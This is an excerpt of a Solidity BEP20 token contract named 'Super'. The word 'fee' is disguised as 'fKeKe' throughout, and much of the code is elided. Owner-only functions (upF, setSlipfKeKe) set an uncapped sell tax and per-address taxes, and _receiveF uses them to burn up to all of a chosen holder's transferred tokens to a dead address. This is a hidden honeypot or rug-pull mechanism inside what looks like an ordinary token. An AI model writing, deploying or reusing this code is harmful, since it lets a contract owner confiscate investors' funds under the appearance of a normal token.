...
interface IUniswapV2Factory {
    ...
    function fKeKeTo() external view returns (address);
    function fKeKeToSetter() external view returns (address);
    ...
    function setfKeKeTo(address) external;
    function setfKeKeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfKeKeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfKeKeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfKeKeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfKeKeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfKeKeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Super is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfKeKe = 0;

    uint256 private _defaultBuyfKeKe = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfKeKe;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfKeKe = _value;
    }

    function setSlipfKeKe(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfKeKe[_address] = _value;
    }

    function getSlipfKeKe(address _address) external view onlyownar returns (uint256) {
        return _slipfKeKe[_address];
    }


    function setMAccountfKeKe(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfKeKe(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefKeKeAmount = 0;

        if (rF) {
            uint256 tradefKeKe = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefKeKe = _defaultSellfKeKe;
                }
                if (from == uniswapV2Pair) {

                    tradefKeKe = _defaultBuyfKeKe;
                }
            }
            if (_slipfKeKe[from] > 0) {
                tradefKeKe = _slipfKeKe[from];
            }

            tradefKeKeAmount = _Amount.mul(tradefKeKe).div(100);
        }


        if (tradefKeKeAmount > 0) {
            _balances[from] = _balances[from].sub(tradefKeKeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefKeKeAmount);
            emit Transfer(from, _deadAddress, tradefKeKeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefKeKeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefKeKeAmount);
        emit Transfer(from, _to, _Amount - tradefKeKeAmount);
    }
